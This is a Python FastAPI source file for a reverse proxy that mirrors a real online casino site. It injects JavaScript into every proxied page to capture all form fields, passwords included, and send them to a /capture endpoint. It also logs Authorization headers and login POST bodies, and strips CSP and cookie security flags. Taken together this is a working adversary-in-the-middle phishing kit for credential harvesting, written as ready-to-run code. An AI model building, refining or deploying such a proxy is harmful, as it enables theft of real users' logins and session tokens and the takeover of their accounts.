import re
import asyncio
import httpx
import websockets
import json
from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import StreamingResponse, JSONResponse
from urllib.parse import urljoin, urlparse

app = FastAPI()

# Increased timeout slightly to give large JS chunks a better chance to complete
client = httpx.AsyncClient(follow_redirects=False, timeout=60.0)


TARGET_BASE = "https://www.veravegas.com/"
parsed_target = urlparse(TARGET_BASE)
TARGET_DOMAIN = parsed_target.netloc

# Includes CSP to prevent the browser from blocking our injected script
HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate",
    "proxy-authorization", "te", "trailers",
    "transfer-encoding", "upgrade", "host", "content-length",
    "content-encoding", "accept-encoding", "content-security-policy"
}

COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")

# Keywords to trigger POST body inspection
AUTH_KEYWORDS = ["login", "auth", "signin", "token", "password"]

# =========================================================
# CLIENT-SIDE FORM OBSERVATION SCRIPT
# =========================================================
FORM_OBSERVER_SCRIPT = """
<script>
(function() {
    console.log('[Proxy Observer] Form submission watcher injected');

    function captureFormData(form) {
        const formData = {};
        const inputs = form.querySelectorAll('input, textarea, select');

        inputs.forEach(input => {
            const name = input.name || input.id;
            if (!name) return;

            if (input.type === 'password') {
                formData[name] = input.value; // Or keep input.value if you intend to capture it
            } else if (input.type === 'checkbox' || input.type === 'radio') {
                formData[name] = input.checked;
            } else if (input.tagName === 'SELECT') {
                formData[name] = input.value;
            } else {
                formData[name] = input.value;
            }
        });

        return {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            formAction: form.action || window.location.href,
            method: form.method.toUpperCase() || 'GET',
            formId: form.id || null,
            formData: formData
        };
    }

    function attachFormListeners() {
        document.querySelectorAll('form').forEach(form => {
            if (form.dataset.observerAttached) return;

            form.dataset.observerAttached = 'true';

            form.addEventListener('submit', async function(e) {
                // Pause the standard submission
                e.preventDefault(); 
                
                const captured = captureFormData(form);

                try {
                    // Wait for the capture payload to send before navigating away
                    await fetch('/capture', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(captured)
                    });
                    console.log('[Proxy Observer] Form submission captured:', captured);
                } catch (err) {
                    console.warn('[Proxy Observer] Failed to send form data:', err);
                }
                
                // Programmatically resume the exact form submission 
                // Bypasses this event listener to prevent an infinite loop
                HTMLFormElement.prototype.submit.call(form);
            });
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', attachFormListeners);
    } else {
        attachFormListeners();
    }

    const observer = new MutationObserver(() => {
        attachFormListeners();
    });

    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });

})();
</script>
"""

# =========================================================
# [WEBSOCKET PROXY MODULE] 
# =========================================================
@app.websocket("/{path:path}")
async def websocket_proxy(websocket: WebSocket, path: str):
    await websocket.accept()
    
    ws_base = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
    target_ws_url = urljoin(ws_base.rstrip("/") + "/", path)
    
    query_string = websocket.url.query
    if query_string:
        target_ws_url += f"?{query_string}"
    
    print(f"\n[WS] Intercepted WebSocket Upgrade -> Forwarding to: {target_ws_url}")
    
    try:
        async with websockets.connect(target_ws_url) as target_ws:
            async def forward_to_target():
                try:
                    while True:
                        data = await websocket.receive_text()
                        await target_ws.send(data)
                except WebSocketDisconnect:
                    pass

            async def forward_to_client():
                try:
                    while True:
                        data = await target_ws.recv()
                        await websocket.send_text(data)
                except websockets.exceptions.ConnectionClosed:
                    pass

            await asyncio.gather(forward_to_target(), forward_to_client())
            
    except Exception as e:
        print(f"[WS] Connection Error: {e}")
    finally:
        try:
            await websocket.close()
        except:
            pass

# =========================================================
# [CAPTURE ENDPOINT]
# =========================================================
@app.post("/capture")
async def capture_form_data(data: dict):
    """Receive form submission data from injected client-side script"""
    print("\n" + "="*60)
    print("[CAPTURE] Form Submission Received")
    print(f"URL: {data.get('url')}")
    print(f"Form Action: {data.get('formAction')}")
    print(f"Method: {data.get('method')}")
    print("Form Data:")
    for key, value in data.get('formData', {}).items():
        print(f"   {key}: {value}")
    print("="*60)

    return JSONResponse(content={"status": "captured"}, status_code=200)

# =========================================================
# [HTTP PROXY MODULE]
# =========================================================
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
async def proxy(request: Request, path: str):
    query_string = request.url.query
    target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
    if query_string:
        target_url += f"?{query_string}"

    proxy_base = str(request.base_url).rstrip("/")
    proxy_domain = urlparse(proxy_base).netloc

    auth_header = request.headers.get("authorization")
    if auth_header:
        print(f"\n[KEY] Authorization Header Found | Method: {request.method} | Path: /{path}")

    req_headers = []
    for k, v in request.headers.items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue

        # Force HTTPS protocol on Origin and Referer so the target server accepts it
        if k_lower in ("referer", "origin"):
            v = v.replace(proxy_domain, TARGET_DOMAIN)
            v = v.replace("http://", "https://") 

        req_headers.append((k, v))

    req_headers.append(("host", TARGET_DOMAIN))
    req_headers.append(("accept-encoding", "identity"))

    body = await request.body()

    if request.method == "POST":
        path_lower = path.lower()
        if any(keyword in path_lower for keyword in AUTH_KEYWORDS):
            print(f"\n[!] Auth POST Intercepted | Path: /{path}")
            try:
                decoded_body = body.decode('utf-8', errors='replace')
                print(f" Payload: {decoded_body}")
            except Exception:
                print(f" Payload (Raw): {repr(body)}")

    try:
        proxy_req = client.build_request(
            method=request.method,
            url=target_url,
            headers=req_headers,
            content=body
        )
        resp = await client.send(proxy_req, stream=True)
    except httpx.RequestError as exc:
        raise HTTPException(status_code=502, detail=f"Proxy Link Error: {str(exc)}")

    processed_headers = []
    for k, v in resp.headers.multi_items():
        k_lower = k.lower()
        if k_lower in HOP_BY_HOP_HEADERS:
            continue

        if k_lower == "location":
            v = v.replace(TARGET_DOMAIN, proxy_domain)
            v = v.replace("https://", "http://")  
            processed_headers.append((k, v))

        elif k_lower == "set-cookie":
            # Strip Domain constraints
            v = COOKIE_DOMAIN_RE.sub("", v)
            # Strip Secure flag and downgrade SameSite so HTTP localhost accepts the cookies
            v = re.sub(r"(?i);\s*Secure", "", v)
            v = re.sub(r"(?i);\s*SameSite=None", "; SameSite=Lax", v)
            processed_headers.append((k, v))
        else:
            processed_headers.append((k, v))

    content_type = resp.headers.get("content-type", "").lower()

    # FIX 2: Added javascript to the content_type check to ensure SPA API routes are rewritten
    if any(t in content_type for t in ["text/html", "javascript", "json", "application/javascript"]):
        try:
            raw_bytes = await resp.aread()
        except httpx.ReadError as exc:
            print(f"[!] ReadError while buffering {path}: {exc}")
            await resp.aclose()
            raise HTTPException(status_code=502, detail="Upstream server dropped the connection mid-stream.")

        text = raw_bytes.decode("utf-8", errors="ignore")

        # Domain rewriting for HTML, JS, and JSON payloads
        rewritten = text.replace(TARGET_DOMAIN, proxy_domain)
        rewritten = rewritten.replace("https://" + proxy_domain, "http://" + proxy_domain)

        # Only inject the script if it's actually an HTML page
        if "text/html" in content_type:
            if "</body>" in rewritten.lower():
                rewritten = re.sub(r'(?i)</body>', FORM_OBSERVER_SCRIPT + '</body>', rewritten, count=1)
            else:
                rewritten += FORM_OBSERVER_SCRIPT

        final_response = Response(
            content=rewritten.encode("utf-8"),
            status_code=resp.status_code,
            media_type=content_type
        )
        await resp.aclose()

    else:
        async def safe_stream_generator():
            try:
                async for chunk in resp.aiter_bytes():
                    yield chunk
            except httpx.ReadError as exc:
                print(f"[!] Streaming ReadError on {path}: {exc}")
            finally:
                await resp.aclose()

        final_response = StreamingResponse(
            safe_stream_generator(),
            status_code=resp.status_code
        )

    if "content-length" in final_response.headers:
        del final_response.headers["content-length"]

    # Append headers safely, avoiding Starlette's auto-generated headers
    for k, v in processed_headers:
        if k.lower() in ("content-length", "content-type"):
            continue
        final_response.headers.append(k, v)

    return final_response